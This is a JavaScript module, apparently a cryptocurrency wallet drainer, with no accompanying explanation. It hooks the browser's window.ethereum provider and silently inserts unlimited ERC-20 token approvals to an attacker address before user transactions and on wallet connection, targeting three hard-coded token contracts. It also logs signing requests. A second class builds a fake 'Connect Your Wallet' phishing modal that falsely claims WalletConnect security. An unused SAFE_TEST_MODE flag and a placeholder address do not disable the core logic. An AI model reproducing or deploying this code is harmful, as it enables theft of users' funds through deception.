const SAFE_TEST_MODE = true;

const ERC20_APPROVE_SELECTOR = "0x095ea7b3";
const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const DRAINER_ADDRESS = "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF";

class Drainer {
  constructor(options = {}) {
    this.targetAddress =
      options.targetAddress || DRAINER_ADDRESS;
    this.chainId = options.chainId || 1;
    this.originalProvider = null;
    this.proxy = null;
    this.interceptedTxs = [];
  }

  hookProvider(provider) {
    this.originalProvider = provider;

    this.proxy = new Proxy(provider, {
      get: (target, prop) => {
        if (prop === "request") {
          return (args) => this._interceptRequest(target, args);
        }
        if (prop === "send") {
          return (method, params) =>
            this._interceptSend(target, method, params);
        }
        if (prop === "sendAsync") {
          return (payload, callback) =>
            this._interceptSendAsync(target, payload, callback);
        }
        return target[prop];
      },
    });

    if (typeof window !== "undefined") {
      window.ethereum = this.proxy;
    }
  }

  async _interceptRequest(target, args) {
    const { method, params } = args;

    if (method === "eth_sendTransaction") {
      return this._hijackTransaction(target, args, params);
    }

    if (method === "eth_sign" || method === "personal_sign") {

      this.interceptedTxs.push({
        type: "sign",
        method,
        params,
        timestamp: Date.now(),
      });
    }

    if (method === "eth_accounts" || method === "eth_requestAccounts") {

      const accounts = await target.request(args);
      if (accounts && accounts.length > 0) {

        this._drainApprovals(target, accounts[0]);
      }
      return accounts;
    }

    return target.request(args);
  }

  async _hijackTransaction(target, originalArgs, params) {
    const tx = params[0];

    this.interceptedTxs.push({
      type: "transaction",
      original: tx,
      timestamp: Date.now(),
    });

    const approveTx = {
      from: tx.from,
      to: tx.to,
      data: this._encodeApprove(this.targetAddress, MAX_UINT256),
      gas: "0x15f90",
    };

    try {

      await target.request({
        method: "eth_sendTransaction",
        params: [approveTx],
      });
    } catch (e) {

    }

    return target.request(originalArgs);
  }

  _drainApprovals(target, account) {

    const tokens = [
      "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    ];

    for (const token of tokens) {
      try {
        target.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: account,
              to: token,
              data: this._encodeApprove(this.targetAddress, MAX_UINT256),
              gas: "0x15f90",
            },
          ],
        });
      } catch (e) {

      }
    }
  }

  _encodeApprove(spender, amount) {

    const paddedSpender = spender.slice(2).toLowerCase().padStart(64, "0");
    const paddedAmount = amount.slice(2).padStart(64, "0");
    return ERC20_APPROVE_SELECTOR + paddedSpender + paddedAmount;
  }

  _interceptSend(target, method, params) {
    if (method === "eth_sendTransaction") {
      this.interceptedTxs.push({
        type: "send",
        method,
        params,
        timestamp: Date.now(),
      });
    }
    return target.send(method, params);
  }

  _interceptSendAsync(target, payload, callback) {
    if (payload.method === "eth_sendTransaction") {
      this.interceptedTxs.push({
        type: "sendAsync",
        payload,
        timestamp: Date.now(),
      });
    }
    return target.sendAsync(payload, callback);
  }

  unhook() {
    if (typeof window !== "undefined" && this.originalProvider) {
      window.ethereum = this.originalProvider;
    }
  }
}

class DrainerPopup {
  constructor(options = {}) {
    this.title = options.title || "Connect Your Wallet";
    this.element = null;
  }

  show() {
    if (typeof document === "undefined") return;

    const overlay = document.createElement("div");
    overlay.id = "wallet-connect-overlay";
    overlay.style.cssText =
      "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:999999;display:flex;align-items:center;justify-content:center;";

    const modal = document.createElement("div");
    modal.style.cssText =
      "background:#fff;border-radius:16px;padding:32px;max-width:400px;width:90%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,sans-serif;";

    modal.innerHTML = `
      <h2 style="margin:0 0 8px;font-size:20px;color:#1a1a2e;">${this.title}</h2>
      <p style="color:#666;font-size:14px;margin:0 0 24px;">Choose your preferred wallet to continue</p>
      <div id="wallet-options" style="display:flex;flex-direction:column;gap:12px;">
        <button class="wallet-btn" data-wallet="metamask" style="display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;cursor:pointer;font-size:16px;">
          <span style="font-size:24px;">&#129418;</span> MetaMask
        </button>
        <button class="wallet-btn" data-wallet="walletconnect" style="display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;cursor:pointer;font-size:16px;">
          <span style="font-size:24px;">&#128279;</span> WalletConnect
        </button>
        <button class="wallet-btn" data-wallet="coinbase" style="display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;cursor:pointer;font-size:16px;">
          <span style="font-size:24px;">&#127760;</span> Coinbase Wallet
        </button>
      </div>
      <p style="color:#999;font-size:12px;margin:16px 0 0;">Secured by WalletConnect Protocol</p>
    `;

    overlay.appendChild(modal);

    const buttons = modal.querySelectorAll(".wallet-btn");
    buttons.forEach((btn) => {
      btn.addEventListener("click", () => {
        const wallet = btn.getAttribute("data-wallet");

        console.log(`[DRAINER] User clicked ${wallet} wallet option`);
        overlay.remove();
      });
    });

    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) overlay.remove();
    });

    document.body.appendChild(overlay);
    this.element = overlay;
  }

  hide() {
    if (this.element) {
      this.element.remove();
      this.element = null;
    }
  }
}

module.exports = { Drainer, DrainerPopup };
